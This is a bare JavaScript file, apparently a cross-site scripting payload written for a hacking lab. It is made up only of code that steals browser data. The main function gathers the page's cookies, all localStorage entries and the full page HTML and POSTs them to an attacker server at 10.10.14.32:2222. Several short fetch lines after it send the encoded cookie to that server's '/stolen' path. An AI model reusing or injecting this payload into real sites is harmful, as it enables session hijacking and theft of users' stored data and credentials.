(function () {
    // Function to collect all the data
    const collectData = () => {
        const data = {
            cookies: document.cookie, // Retrieve all cookies
            localStorage: {}, // Retrieve localStorage key-value pairs
            htmlContent: document.documentElement.outerHTML, // Retrieve the entire HTML content
        };

        // Iterate over localStorage and save all key-value pairs
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            data.localStorage[key] = localStorage.getItem(key);
        }

        return data;
    };

    // Function to send data via POST
    const sendData = (data) => {
        const serverUrl = "http://10.10.14.32:2222/"; // Replace with your server URL

        fetch(serverUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json", // Set content type to JSON
            },
            body: data, // Convert data to JSON
        })
            .then(response => {
                if (response.ok) {
                    console.log("Data successfully sent!");
                } else {
                    console.error("Failed to send data:", response.statusText);
                }
            })
            .catch(error => console.error("Error during the POST request:", error));
    };

    // Collect data and send it
    const data = collectData();
    sendData(data);
})();




fetch("http://10.10.14.32:2222/stolen?cookie="+  encodeURIComponent(document.cookie))
x = encodeURIComponent(document.cookie)

fetch("http://10.10.14.32:2222/stolen?cookie=" + x, {
    credentials: true,
})
fetch("http://10.10.14.32:2222/stolen?cookie=" + x, {
    method:"POST",
    body: {
        x
    }
})


